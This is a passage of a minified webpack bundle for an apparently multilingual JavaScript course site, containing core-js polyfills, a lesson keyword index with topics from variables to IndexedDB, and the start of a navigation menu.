n===z&&K(B,e,_),y(n),e=j(e,!0),y(_),o(q,e)?(_.enumerable?(o(n,F)&&n[F][e]&&(n[F][e]=!1),_=S(_,{enumerable:x(0,!1)})):(o(n,F)||O(n,F,x(1,{})),n[F][e]=!0),G(n,e,_)):O(n,e,_)},X=function(n,e){y(n);for(var _,t=g(e=v(e)),o=0,r=t.length;r>o;)K(n,_=t[o++],e[_]);return n},Q=function(n){var e=R.call(this,n=j(n,!0));return!(this===z&&o(q,n)&&!o(B,n))&&(!(e||!o(this,n)||!o(q,n)||o(this,F)&&this[F][n])||e)},Z=function(n,e){if(n=v(n),e=j(e,!0),n!==z||!o(q,e)||o(B,e)){var _=P(n,e);return!_||!o(q,e)||o(n,F)&&n[F][e]||(_.enumerable=!0),_}},nn=function(n){for(var e,_=N(v(n)),t=[],r=0;_.length>r;)o(q,e=_[r++])||e==F||e==i||t.push(e);return t},en=function(n){for(var e,_=n===z,t=N(_?B:v(n)),r=[],s=0;t.length>s;)!o(q,e=t[s++])||_&&!o(z,e)||r.push(q[e]);return r};W||(a((M=function(){if(this instanceof M)throw TypeError("Symbol is not a constructor!");var n=m(arguments.length>0?arguments[0]:void 0),e=function(_){this===z&&e.call(B,_),o(this,F)&&o(this[F],n)&&(this[F][n]=!1),G(this,n,x(1,_))};return r&&J&&G(z,n,{configurable:!0,set:e}),V(n)})[L],"toString",(function(){return this._k})),E.f=Z,T.f=K,_(23663).f=k.f=nn,_(84313).f=Q,A.f=en,r&&!_(35446)&&a(z,"propertyIsEnumerable",Q,!0),p.f=function(n){return V(d(n))}),s(s.G+s.W+s.F*!W,{Symbol:M});for(var _n="hasInstance,isConcatSpreadable,iterator,match,replace,search,species,split,toPrimitive,toStringTag,unscopables".split(","),tn=0;_n.length>tn;)d(_n[tn++]);for(var on=I(d.store),rn=0;on.length>rn;)h(on[rn++]);s(s.S+s.F*!W,"Symbol",{for:function(n){return o(U,n+="")?U[n]:U[n]=M(n)},keyFor:function(n){if(!Y(n))throw TypeError(n+" is not a symbol!");for(var e in U)if(U[e]===n)return e},useSetter:function(){J=!0},useSimple:function(){J=!1}}),s(s.S+s.F*!W,"Object",{create:function(n,e){return void 0===e?S(n):X(S(n),e)},defineProperty:K,defineProperties:X,getOwnPropertyDescriptor:Z,getOwnPropertyNames:nn,getOwnPropertySymbols:en});var sn=c((function(){A.f(1)}));s(s.S+s.F*sn,"Object",{getOwnPropertySymbols:function(n){return A.f(w(n))}}),C&&s(s.S+s.F*(!W||c((function(){var n=M();return"[null]"!=D([n])||"{}"!=D({a:n})||"{}"!=D(Object(n))}))),"JSON",{stringify:function(n){for(var e,_,t=[n],o=1;arguments.length>o;)t.push(arguments[o++]);if(_=e=t[1],(b(e)||void 0!==n)&&!Y(n))return f(e)||(e=function(n,e){if("function"==typeof _&&(e=_.call(this,n,e)),!Y(e))return e}),t[1]=e,D.apply(C,t)}}),M[L][H]||_(94005)(M[L],H,M[L].valueOf),u(M,"Symbol"),u(Math,"Math",!0),u(t.JSON,"JSON",!0)},64242:(n,e,_)=>{"use strict";var t=_(96375),o=_(4869),r=_(32088),s=_(13068),a=_(56213),i=_(54117),c=_(65041),l=_(91790).ArrayBuffer,u=_(3214),m=r.ArrayBuffer,d=r.DataView,p=o.ABV&&l.isView,h=m.prototype.slice,g=o.VIEW,f="ArrayBuffer";t(t.G+t.W+t.F*(l!==m),{ArrayBuffer:m}),t(t.S+t.F*!o.CONSTR,f,{isView:function(n){return p&&p(n)||c(n)&&g in n}}),t(t.P+t.U+t.F*_(94944)((function(){return!new m(2).slice(1,void 0).byteLength})),f,{slice:function(n,e){if(void 0!==h&&void 0===e)return h.call(s(this),n);for(var _=s(this).byteLength,t=a(n,_),o=a(void 0===e?_:e,_),r=new(u(this,m))(i(o-t)),c=new d(this),l=new d(r),p=0;t<o;)l.setUint8(p++,c.getUint8(t++));return r}}),_(59834)(f)},37372:(n,e,_)=>{var t=_(96375);t(t.G+t.W+t.F*!_(4869).ABV,{DataView:_(32088).DataView})},24669:(n,e,_)=>{_(11761)("Float32",4,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},37810:(n,e,_)=>{_(11761)("Float64",8,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},17644:(n,e,_)=>{_(11761)("Int16",2,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},62282:(n,e,_)=>{_(11761)("Int32",4,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},43315:(n,e,_)=>{_(11761)("Int8",1,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},39551:(n,e,_)=>{_(11761)("Uint16",2,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},47489:(n,e,_)=>{_(11761)("Uint32",4,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},70870:(n,e,_)=>{_(11761)("Uint8",1,(function(n){return function(e,_,t){return n(this,e,_,t)}}))},76693:(n,e,_)=>{_(11761)("Uint8",1,(function(n){return function(e,_,t){return n(this,e,_,t)}}),!0)},93277:(n,e,_)=>{"use strict";var t,o=_(91790),r=_(1307)(0),s=_(1043),a=_(40324),i=_(35014),c=_(20114),l=_(65041),u=_(77200),m=_(77200),d=!o.ActiveXObject&&"ActiveXObject"in o,p="WeakMap",h=a.getWeak,g=Object.isExtensible,f=c.ufstore,y=function(n){return function(){return n(this,arguments.length>0?arguments[0]:void 0)}},b={get:function(n){if(l(n)){var e=h(n);return!0===e?f(u(this,p)).get(n):e?e[this._i]:void 0}},set:function(n,e){return c.def(u(this,p),n,e)}},w=n.exports=_(76173)(p,y,b,c,!0,!0);m&&d&&(i((t=c.getConstructor(y,p)).prototype,b),a.NEED=!0,r(["delete","has","get","set"],(function(n){var e=w.prototype,_=e[n];s(e,n,(function(e,o){if(l(e)&&!g(e)){this._f||(this._f=new t);var r=this._f[n](e,o);return"set"==n?this:r}return _.call(this,e,o)}))})))},92027:(n,e,_)=>{"use strict";var t=_(20114),o=_(77200),r="WeakSet";_(76173)(r,(function(n){return function(){return n(this,arguments.length>0?arguments[0]:void 0)}}),{add:function(n){return t.def(o(this,r),n,!0)}},t,!1,!0)},18158:(n,e,_)=>{"use strict";var t=_(96375),o=_(42826),r=_(3366),s=_(54117),a=_(61635),i=_(93900);t(t.P,"Array",{flatMap:function(n){var e,_,t=r(this);return a(n),e=s(t.length),_=i(t,0),o(_,t,t,e,0,1,n,arguments[1]),_}}),_(66864)("flatMap")},92791:(n,e,_)=>{"use strict";var t=_(96375),o=_(45120)(!0);t(t.P,"Array",{includes:function(n){return o(this,n,arguments.length>1?arguments[1]:void 0)}}),_(66864)("includes")},99682:(n,e,_)=>{var t=_(96375),o=_(64022)(!0);t(t.S,"Object",{entries:function(n){return o(n)}})},58430:(n,e,_)=>{var t=_(96375),o=_(3846),r=_(36173),s=_(45481),a=_(25299);t(t.S,"Object",{getOwnPropertyDescriptors:function(n){for(var e,_,t=r(n),i=s.f,c=o(t),l={},u=0;c.length>u;)void 0!==(_=i(t,e=c[u++]))&&a(l,e,_);return l}})},91970:(n,e,_)=>{var t=_(96375),o=_(64022)(!1);t(t.S,"Object",{values:function(n){return o(n)}})},49647:(n,e,_)=>{"use strict";var t=_(96375),o=_(3750),r=_(91790),s=_(3214),a=_(99117);t(t.P+t.R,"Promise",{finally:function(n){var e=s(this,o.Promise||r.Promise),_="function"==typeof n;return this.then(_?function(_){return a(e,n()).then((function(){return _}))}:n,_?function(_){return a(e,n()).then((function(){throw _}))}:n)}})},72117:(n,e,_)=>{"use strict";var t=_(96375),o=_(60880),r=_(79354),s=/Version\/10\.\d+(\.\d+)?( Mobile\/\w+)? Safari\//.test(r);t(t.P+t.F*s,"String",{padEnd:function(n){return o(this,n,arguments.length>1?arguments[1]:void 0,!1)}})},11708:(n,e,_)=>{"use strict";var t=_(96375),o=_(60880),r=_(79354),s=/Version\/10\.\d+(\.\d+)?( Mobile\/\w+)? Safari\//.test(r);t(t.P+t.F*s,"String",{padStart:function(n){return o(this,n,arguments.length>1?arguments[1]:void 0,!0)}})},30550:(n,e,_)=>{"use strict";_(40941)("trimLeft",(function(n){return function(){return n(this,1)}}),"trimStart")},45633:(n,e,_)=>{"use strict";_(40941)("trimRight",(function(n){return function(){return n(this,2)}}),"trimEnd")},36364:(n,e,_)=>{_(89960)("asyncIterator")},87690:(n,e,_)=>{for(var t=_(39429),o=_(82663),r=_(1043),s=_(91790),a=_(94005),i=_(16594),c=_(12814),l=c("iterator"),u=c("toStringTag"),m=i.Array,d={CSSRuleList:!0,CSSStyleDeclaration:!1,CSSValueList:!1,ClientRectList:!1,DOMRectList:!1,DOMStringList:!1,DOMTokenList:!0,DataTransferItemList:!1,FileList:!1,HTMLAllCollection:!1,HTMLCollection:!1,HTMLFormElement:!1,HTMLSelectElement:!1,MediaList:!0,MimeTypeArray:!1,NamedNodeMap:!1,NodeList:!0,PaintRequestList:!1,Plugin:!1,PluginArray:!1,SVGLengthList:!1,SVGNumberList:!1,SVGPathSegList:!1,SVGPointList:!1,SVGStringList:!1,SVGTransformList:!1,SourceBufferList:!1,StyleSheetList:!0,TextTrackCueList:!1,TextTrackList:!1,TouchList:!1},p=o(d),h=0;h<p.length;h++){var g,f=p[h],y=d[f],b=s[f],w=b&&b.prototype;if(w&&(w[l]||a(w,l,m),w[u]||a(w,u,f),i[f]=m,y))for(g in t)w[g]||r(w,g,t[g],!0)}},79729:(n,e,_)=>{var t=_(96375),o=_(20708);t(t.G+t.B,{setImmediate:o.set,clearImmediate:o.clear})},1212:(n,e,_)=>{var t=_(91790),o=_(96375),r=_(79354),s=[].slice,a=/MSIE .\./.test(r),i=function(n){return function(e,_){var t=arguments.length>2,o=!!t&&s.call(arguments,2);return n(t?function(){("function"==typeof e?e:Function(e)).apply(this,o)}:e,_)}};o(o.G+o.B+o.F*a,{setTimeout:i(t.setTimeout),setInterval:i(t.setInterval)})},38767:(n,e,_)=>{_(1212),_(79729),_(87690),n.exports=_(3750)},37953:(n,e,_)=>{"use strict";function t(n){return t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},t(n)}function o(n,e,_){return(e=function(n){var e=function(n){if("object"!=t(n)||!n)return n;var e=n[Symbol.toPrimitive];if(void 0!==e){var _=e.call(n,"string");if("object"!=t(_))return _;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(n)}(n);return"symbol"==t(e)?e:e+""}(e))in n?Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}):n[e]=_,n}function r(n){return function(n){if(Array.isArray(n))return s(n)}(n)||function(n){if("undefined"!=typeof Symbol&&null!=n[Symbol.iterator]||null!=n["@@iterator"])return Array.from(n)}(n)||function(n,e){if(n){if("string"==typeof n)return s(n,e);var _={}.toString.call(n).slice(8,-1);return"Object"===_&&n.constructor&&(_=n.constructor.name),"Map"===_||"Set"===_?Array.from(n):"Arguments"===_||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(_)?s(n,e):void 0}}(n)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function s(n,e){(null==e||e>n.length)&&(e=n.length);for(var _=0,t=Array(e);_<e;_++)t[_]=n[_];return t}_.r(e),_.d(e,{default:()=>l});var a=_(60569),i=a.keys().filter((function(n){return"./"!==n&&"./index"!==n&&"./index.js"!==n})),c=Object.assign.apply(Object,[{}].concat(r(i.map((function(n){return o({},n.split("./").join("").split(".js").join(""),a(n))})))));const l=Object.assign.apply(Object,[{}].concat(r(Object.keys(c).map((function(n){return o({},n,c[n][n])})))))},82057:(n,e,_)=>{"use strict";var t;function o(n){return o="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},o(n)}function r(n,e,_){return(e=function(n){var e=function(n){if("object"!=o(n)||!n)return n;var e=n[Symbol.toPrimitive];if(void 0!==e){var _=e.call(n,"string");if("object"!=o(_))return _;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(n)}(n);return"symbol"==o(e)?e:e+""}(e))in n?Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}):n[e]=_,n}_.r(e),_.d(e,{keywords:()=>s});var s=(r(r(r(r(r(r(r(r(r(r(t={"Block-diagram":["algorithm","sequence","branching","loop","fibonacci sequence","flowchart"],"Developer-tools":["console","devtools","browser"],"Chrome-dev-tools":["sources","pages","snippets","debugger","call stack","breakpoints","watch","devtools","chrome devtools","scope"],var:["var","referenceerror","undefined","string","number","boolean","typing","dynamic typing","ecmascript","data types"],typeof:["typing","typeof","string","number","boolean","undefined","object","function","symbol","null","array","nan","infinity","true","false"],"data-structures":["aray","index","element","object","instance","property","value"],Assignments:["typing","dynamic typing","+=","-=","*=","/=","%=","remainder","assignment","value"],Boolean:["operand","boolean","true","false","comparison operator","logical operations","logical expression","boolean","strict equality"],"Conditional-operators":["if","else","ternary operator","boolean","logical expression","branching","operand","conditional operator"],Increment:["postfix form","prefix form","increment","decrement"],length:["length","property","array","string","symbol","element"],for:["loop","for","iteration","counter","continue","break","condition","loop variable","increment"],"UTF-8":["character code","encoding table","utf-8"],"hw-01":["flowchart","loop operator","conditional operator"],"Explicit-type-conversion":["type coercion","typing","dynamic typing","string","number","boolean","parseInt","parseFloat","nan","object","tostring","explicit"],"Implicit-type-conversion":["type coercion","typing","dynamic typing","string","number","boolean","implicit","arithmetic operations","conditional operator","concatenation","logical operations"],"NaN-null-Infinity":["nan","null","infinity"],BigInt:["bigint","rangeerror","bitwise operations","es10"],function:["function declaration","formal parameters","function expression","arguments","return","function call"],methods:["charCodeAt","push","function","method"],"String-methods":["string","methods","concatenation","indexOf","slice","substring","substr","tolowercase","touppercase","split","trim","charat","charcodeat","repeat","replace","padstart","padend"],"String-fromCharCode":["fromcharcode","method","string","constructor"],literals:["literal","variables in a literal","string","multiline text","es6"],"Array-methods":["method","push","pop","shift","unshift","splice","slice","concat","join","includes","element","array","length"],"Date-constructor":["date","constructor","day","full year","month","get","set","year","hours","minutes","seconds","tolocale","tolocalestring","tolocaledatestring","tolocaletimestring","locale"],"self-work-02":["array","function","object","string","symbol","char","method"],"practice-with-XSS":["xss","code injection","breakpoints","devtools","chrome devtools","sources"],"hw-02":["array","conditional operator","string","date"],while:["cycle","loop","iterable","while"],"for-of-for-in":["cycle","iterable","loop","iteration","traversal","array","object","property","element"],"default-param-values":["default parameter values","function","parameters","values","arguments","call","null","undefined"],"function-object":["arguments","object","function","callee","arguments.callee","context","call context","execution context","this","lexical environment","scope chain","hoisting","call stack","global object"],"practice-03":["devtools","chrome devtools","breakpoint","watch","array"],"hw-03":[],"native-and-host-objects":["native objects","host objects","object literal","own property","public","private","property","inherited property","enumerable","non-enumerable","encapsulation","inheritance","prototype","constructor","instance","this"],"inheritance-model":["new","inheritance","prototype","constructor","instance","this","proto","object","prototype chain","call context","Object","class","reference","context","encapsulation"],"in-operator":["object","property","in","operator"],"hw-04":["handbag","librarybook","addproperty"],"get-and-set":["get","set","property","calculated","getter","setter","price uah","calculator","human states"],"call-apply-bind":["constructor","function","inheritance","call context","this","apply","call","bind","decorator","currying","binding","changing the call context"],"call-apply-bind-currying":["constructor","function","inheritance","call context","this","apply","call","bind","decorator","currying","binding","changing the call context"],"value-of":["valueof","primitive value"],Error:["constructor","error","try","catch","finally","throw"],switch:["switch","branching","conditional operator","case","default"],"hw-05":["modificator","generateError"],BOM:["window","viewport","console","navigator","screen","location","history","document","geolocation","position","hash","host","href","origin","port","protocol","search","state","back","forward","go","open","write","close"],"BOM-postMessage":["window","postMessage","message","post","onmessage"],DOM:["dom","object","eventtarget","node","document","head","body","scripts","styleSheets","createElement","htmlunknownelement","createTextNode","getelementbyid","getelementsbytagname","getelementsbyclassname","htmlcollection","queryselector","nodetype","childnodes","appendchild","nodelist","children","element","html","host objects"],"DOM-elements":["appendchild","removechild","remove","parentnode","insertadjacenthtml","insertadjacentelement","insert","childnodes","nodelist","children","htmlcollection","setattribute","getattribute","getboundingclientrect","descendants","parent","collection","insertion","removal"],"hw-06":["classList"],"DOM-events":["event target","event listener","event","dispatchEvent","addEventListener","removeEventListener","DOMNodeInserted","target","Custom Event","callback","event handler","clientx","clienty","eventphase","propagation","preventdefault","stoppropagation","stopimmediatepropagation"],"DOM-MutationObserver":["mutation observer","element","mutation","observer"],forms:["value","onchange","input","type","switches","radio","checked","checkbox","select","selectedindex","option","drop-down list","click","color"],"hw-07":["click","mouseover","mouseout"],"arrow-function":["es6","prototype","arguments","call context","function","this","arrow","arrow function","signature"],functionality:["higher-order function","function as argument","function as return value"],Closure:["closure","lexical environment","iife","immediately invoked function expression","function expression","function","function as return value","var","arguments"],recursion:["recursion","tail recursion","recursion termination condition","call stack","self-invocation","function","recursion depth"],"Event-Loop":["loop","event","event-driven programming","thread","process","heap","call stack","asynchrony","task","queue","callback","function","microtask","promise","task queue","event queue","multithreading","single-threading","core","processor","engine","browser"],Timers:["settimeout","callback","requestanimationframe","debouncing","page refresh rate","timer"],"hw-08":["recursion","timer","settimeout"],"Array-iterating-methods":["iteration","traversal","array","function as argument","function as return value","method","context","loop","foreach","map","filter","find","findindex","every","some","reduce","sort","flatmap","keys","values","iterator"],"JS-heap-memory-allocation":["performance","audits","memory","javascript","profiler","chrome","devtools","rail","paint","load","response","animation","idle","heap","snapshort"],"throttling-and-debouncing":["throttling","debouncing"],SHA:["sha","secure","hash","algorithm","digest","integrity","digital signature","sha256","cdn"],"hw-09":["typemessage","setuserpresent","showpresent","showabsent","present","absent","user","message","timer","settimeout","changeclass"],"let-const":["es6","let","const","scope","functional scope","block scope","closure","var","temporal dead zone","hoisting","referenceerror","syntaxerror","typeerror","error","exception","initialization","lexical","lexicalenvironment"],"Object-static-props":["assign","property","value","own property","descriptor","defineproperty","computed properties","get","set","writable","defineproperties","entries","es8","freeze","immutability","getownpropertydescriptor","enumerable","configurable","getownpropertynames","keys","setprototypeof"],"hw-10":["logging","message","settimeout","callback","constructor"],JSON:["json","stringify","parse","assign","deep copy","data structure depth"],curl:["curl","ptsv2.com","toilet","get","post","crud","http"],XMLHttpRequest:["ajax","api","xmlhttprequest","open","content-type","crud","http","get","post","put","delete","patch","credentials","cookie","send","request","header","setrequestheader","getallresponseheaders","response","readystate","status","statustext","responsetext","type","responsetype","arraybuffer","blob","document","json","string","ptsv2.com","toilet","network","devtools","chrome devtools","onreadystatechange","progress","event","loadstart","loadend","load","error","timeout","запрос","ответ"],"Content-Type":["header","content type","content-type","application","form","json","text","image"],promise:["promise","constructor","callback","microtask","event loop","function","resolve","reject","referenceerror","then","catch","navigator","battery","getbattery","promise.all","promise.resolve","func stuff","microtask","event"],"promise-constructor":["promise","constructor","callback","microtask","function","resolve","reject","referenceerror","then","catch","navigator","battery","getbattery","promise.all","promise.resolve","func stuff","microtask","event loop","event"],"hw-11":["ajax","json","xmlhttprequest","message","logging","settimeout","timer","log","key"],"fetch-API":["ajax","fetch","cors","api","promise","crud","method","post","get","put","delete","patch","head","request","header","response","content-type","credentials","cookie","mode","type","body","readablestream","integrity","method","status","statusText","basic","opaque","arraybuffer","blob","formdata","json","text","clone","int8array","uint8array","http","bodyused","then","server","request","response"],CORS:["ajax","cors","origin","xmlhttprequest","fetch","preflight","request","header","response","access","control","method","access-control","proxy","cross domain","domen","protocol","access-control-allow-origin","server","proxy for cors"],cookie:["cookie","client","page","data","read","write","text","key","value","document","expires","expiration date","utc","date","gettime"],localStorage:["localstorage","client","data","setitem","getitem","removeitem","clear","key","event","storage","local","page","text","store on the client side","clear","add","remove"],"hw-12":["cookie","client","data","read","write","localstorage","location","hash","promise","then"],"named-item":["nameditem","named","htmlcollection","name","document","dom","element","collection"],readableStream:["stream","api","readable","readablestream","constructor","getreader","reader","pipe","enqueue","read","fetch","arraybuffer","blob","thread","read","data","response"],arrayBuffer:["arraybuffer","accessor","dataview","int8array","uint8array","int16array","uint16array","int32array","uint32array","constructor","binary","data","transformation","iterable","array.from","instance"],FileReader:["reader","filereader","file","api","read","readas","readasarraybuffer","arraybuffer","binarystring","readasbinarystring","dataurl","readasdataurl","text","readastext","url","createobjecturl","data","client"],"File-API":["file","api","reader","data","client","files","filelist","input","type","application","json","image","text","size","name","lastmodified","modified","file type","file size"],FormData:["form","constructor","formdata","attribute","name","value","append","key","value","has","get","getall","set","delete","keys","entries","fetch","uploading a file to the server","upload"],"hw-13":["blob","url","createobjecturl","input","files","type","ptsv2.com","toilet","dump"],"async-is-good":["promise","then","call stack","stack","thread","async","await","return","timer","settimeout","microtask","task queue"],"async-await":["async","await","promise","then","syntaxerror","asynchronous function","async function","return","microtask","task queue"],"async-constructor":["function","constructor","asynchronous function","async function","referenceerror"],"async-vs-Promise-all":["function","async","asynchronous function","promise.all","await","then"],"hw-14":["async","await","asynchronous function","function","recursion","then","promise"],API:["api","application","program","interface","request","response","service","endpoint","soa","rpc","rest","soap","csv","json","xml","protocol"],REST:["api","endpoint","operation","resource","crud","post","put","get","delete","patch","json","hateoas","hypermedia","request","responce","service","interface","protocol"],"REST-status":["server","response","status"],"JSON-placeholder":["curl","get","post","put","delete","patch","crud","endpoint","operation","resource","fetch"],"json-server":["json","server","json-server","database","endpoint","localhost","port","http","get","post","put","delete","patch","crud","fetch","xmlhttprequest","head"],scroll:["scrollHeight","scrollWidth","clientHeight","clientWidth","offsetHeight","offsetWidth","scrollTop","scrollLeft","element","size","scrolling","scroll","getboundingclientrect","dom","top","left","bottom","right","width","height","coordinates"],"fake-chat":["endpoint","crud","post","put","get","delete","json","database","json-server","database","chat","http","promise.all","async","await","scrollTop","offsetTop","scrolling"],"hw-15":["endpoint","crud","post","put","get","delete","patch","json","database","json-server","database"],"strict-mode":["strict","strict mode","directive","referenceerror","syntaxerror","delete","octal","typeerror","eval","arguments","callee","arguments.callee","caller","with","implements","interface","let","package","private","protected","public","static","yield"],"computed-prop-names":["es6","property","calculated","name"],"short-method-syntax":["es6","property","name","method","syntax","short","short form"],"shorthand-object-literal":["es6","literal","object","declaration","short","short form","syntax"],Classes:["es6","strict","strict mode","constructor","class","declaration","expression","instanceof","get","set","context","inheritance","extends","super","static","createElementNS","svg","setAttribute","getAttribute","constructor","property","private","public","inherited","own","private property","public property","inherited property","own property"],"hw-16":["class","inherited property","json-server"],fabric:["polymorphism","factory","factory method","pattern","module","closure","iife","interface","class","constructor","instance","non-enumerable","method","enumerable","inherited"],Destructuring:["structure","destructuring","assignment","destructuring assignment","array","object","data","spread","...","rest","operator","collection","iterable"],generators:["symbol","generator","iterator","iterable","symbol.iterator","next","value","done","protocol","iteration","iteration protocol","yield","return","object","structure","data structure","iife","async","await","linked list"],"generators-async":["symbol","generator","iterator","iterable","symbol.iterator","next","value","done","protocol","iteration","iteration protocol","yield","return","await","object","structure","data structure","iife","asynchronous","asynchronous generators","async","promise"],"generators-yield":["symbol","generator","iterator","iterable","symbol.iterator","next","value","done","protocol","iteration","iteration protocol","yield","return","object","structure","data structure","yield*"],"generators-arg":["symbol","iterator","iterable","symbol.iterator","iterator","generator","next","value","done","protocol","iteration","iteration protocol","yield","object","structure","data structure"],"hw-17":["iterable","symbol.iterator","iterator","generator","next","value","done","object","destructuring","destructuring"],"not-defined":["web-component","custom element","customelements","defined","not","selector",":not(:defined)","queryselectorall","nodelist"],"Shadow-DOM":["web-component","custom element","customelements","shadow","dom","shadow dom","api","shadow dom api","attach","attachshadow","mode","open","closed","shadowroot","shadowhost"],"custom-elements":["unknown","htmlunknownelement","htmlelement","prototype","custom","customelements","define","element","web component","component","registration","html5","registry","class","extends","constructor","super","inheritance"],"life-cycle-hooks":["custom element","customelements","web component","lifecycle","hook","lifecycle hook","callback","connectedcallback","disconnectedcallback","attribute","attributechangedcallback","getattribute","setattribute","static","get","observedattributes","event","insert","remove"],"when-defined":["custom element","customelements","web component","lifecycle","hook","lifecycle hook","callback","event","registration","component","registry","class","extends","constructor","super","inheritance","asynchronous","iterator","generator","attribute","promise","whendefined","customelements.whendefined"],template:["custom element","template","document","fragment","documentfragment","layout","markup","html","content","dom","childnodes","node","nodelist","children","htmlcollection","clonenode","insertion","tree"],slots:["slot","custom element","web component","named","default","content"],"web-component-samples":["web-component","custom element","customelements","example","slider","game","spoiler","characters"],"hw-18":["web-component","custom element","customelements","drop-down menu","json-server","registration","slider"],npm:["npm","package","package manager","registry","cdn","node","which","version","root","init","package.json","dependency","dependencies","dev","devdependencies","npmrc",".npmrc","config","install","global","-g","--save","--save-dev","css-loader","node_modules","gitignore","run","scripts","list","--depth=0","depth","search","link","symlink","package-lock","json","package-lock.json","integrity","shrinkwrap","version","deploy","npm-shrinkwrap","npm-shrinkwrap.json","snapshot","installation","deployment"],webpack:["webpack","npm","dependencies","webpack-cli","module","package","embedding","webpack.config.js","js","--config","--watch","config","watch","--mode","mode","build","builder","bundle","file","application"],"webpack-es-modules":["es6","webpack","module","package","js","build","builder","bundle","file","export","import","named","named export","named import","default","default export","default import"],"dynamic-import":["es10","webpack","module","package","build","builder","bundle","file","dynamic","dynamic import","import()","then","settimeout","await","async","path"],"webpack-mode":["webpack","package","build","builder","bundle","file","--mode","mode","development","production","package.json","scripts","npm","run","npm run","debug"],"webpack-package-json":["webpack","module","package","embedding","build","builder","bundle","file","config","watch","--watch","-w","npm","run","npm run","application"],"webpack-css-loaders":["webpack","module","package","embedding","build","builder","bundle","file","loaders","загрузчик","node","node.js","module.exports","exports","require","npm","run","npm run","config","webpack.config.js","rules","module.rules","test","use","style","style-loader","css","css-loader","стили","--save-dev","node_modules","package.json","devdependencies"],"webpack-exercise-6":["webpack","module","package","embedding","build","builder","bundle","file","loaders","загрузчик","node","node.js","module.exports","exports","require","npm","run","npm run","config","webpack.config.js","rules","module.rules","test","use","url","url-loader","limit","размер ","file","file-loader","file","base64","--save-dev","node_modules","package.json","devdependencies"],"webpack-exercise-7":["webpack","module","package","embedding","build","builder","bundle","file","export","import","named","named export","example","sample"],"webpack-exercise-8":["webpack","module","package","embedding","build","builder","bundle","file","font","font awesome","google fonts"],"Final-project":["sprint","final","project","финальный","ts","specification","task"],Symbol:["symbol","property","name","symbol","property","global","registry","description"],Set:["set","constructor","unique"],patterns:["design","pattern","template","OOP","delegation","iterator","gang of four"],"pattern-Observer":["design","pattern","observer","template","OOP"],"pattern-Decorator":["design","pattern","decorator","template","OOP"],"pattern-Strategy":["design","pattern","strategy","template","OOP"],IndexedDB:["api","interface","service","data","database","index","indexing","disk","local","client","key","indexeddb","sql","nosql","store","get","put","add","getAll","cursor","promise","async","await"],"IndexedDB-store":["api","interface","service","data","database","index","indexing","disk","local","client","key","key","indexeddb","sql","nosql","store","db","transaction","request","запрос","transaction","storage","asynchronous","upgradeneeded","versionchange","version","чтение","запись","connection","connect","get","put","add","getAll","cursor","promise","async","await"],"IndexedDB-index":["api","interface","service","data","database","index","indexing","disk","local","client","key","key","indexeddb","sql","nosql","store","db","transaction","request","запрос","transaction","storage","asynchronous","upgradeneeded","versionchange","version","чтение","запись","connection","connect","get","put","add","getAll","cursor","promise","async","await"],"IndexedDB-transaction":["api","interface","service","data","database","index","indexing","disk","local","client","key","indexeddb","sql","nosql","store","db","transaction","request","storage","asynchronous","upgradeneeded","versionchange","version","read","write","connection","connect","get","put","add","getAll","cursor","promise","async","await"],NoSQL:["data","database","relational","tables","relation","index","key","denormalization","normalization","mysql","sql","nosql","acid","distributed system","document","graph","caching","replication","mongo"]},"throttling-and-debouncing",["debounce","throttle","debouncing","throttling","performance"]),"SOLID",["principle","design","OOP","inheritance","delegation","single responsibility","responsibility","open-closed","liskov","liskov substitution","interface","segregation","dependency","inversion","module","interface","dependencies"]),"web-workers",["api","worker","thread","parallel thread","multithreading","single-threading","web-worker","constructor","api","message","channel","messagechannel","postmessage","onmessage"]),"NotificationAPI",["api","notification","desktop","user","request","permission","require","interaction","requireinteraction","title","body","badge","icon","image","silent","options","worker"]),"performance",["api","performance","memory","allocation","runtime"]),"web-socket",["websocket","soket","ws","wss","server","сокет","чат","http"]),"git",["git","bash","cli","command","interpreter","version","repo","repository","github","commit","push","pull","add","remote","clone","ssh"]),"git-bash",["git","bash","cli","command","interpreter","command line","interpreter"]),"tcp-ip",["protocol","tcp","ip","port","datagram","package","internet"]),"localhost",["protocol","http","ip","port","dns","domen","host","internet","www","localhost","url","uri","package"]),r(t,"ECMA",["ecma","specification","language","ecmascript","edition","standard","js"]))},9139:(n,e,_)=>{"use strict";_.r(e),_.d(e,{mainMenu:()=>t});var t=[{ref:"introduction-basics",ua:"Вступ. Основи.",eng:"Introduction. Basics",ru:"Введение. Основы.",items:[{ref:"Block-diagram",ua:"Блок-схема алгоритму",eng:"Flowchart of the algorithm",ru:"Блок-схема алгоритма"},{ref:"Developer-tools",ua:"Інструменти розробника",eng:"Developer tools",ru:"Инструменты разработчика"},{ref:"Chrome-dev-tools",ua:"Chrome DevTools",ru:"Chrome DevTools",eng:"Chrome DevTools"},{ref:"var",ua:"Змінні. Типи даних",eng:"Variables. Data types",ru:"Переменные. Типы данных"},{ref:"data-structures",ua:"Структури даних",eng:"Data structures",ru:"Структуры данных"},{ref:"Boolean",ua:"Логічні конструкції",eng:"Logical constructs",ru:"Логические конструкции"},{ref:"function",ua:"Функції",eng:"Functions",ru:"Функции"},{ref:"hw-flowchart",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"operators",ua:"Оператори. Вирази.",eng:"Operators. Expressions.",ru:"Операторы. Выражения.",items:[{ref:"Assignments",ua:"Оператори присвоювання",eng:"Assignment operators",ru:"Операторы 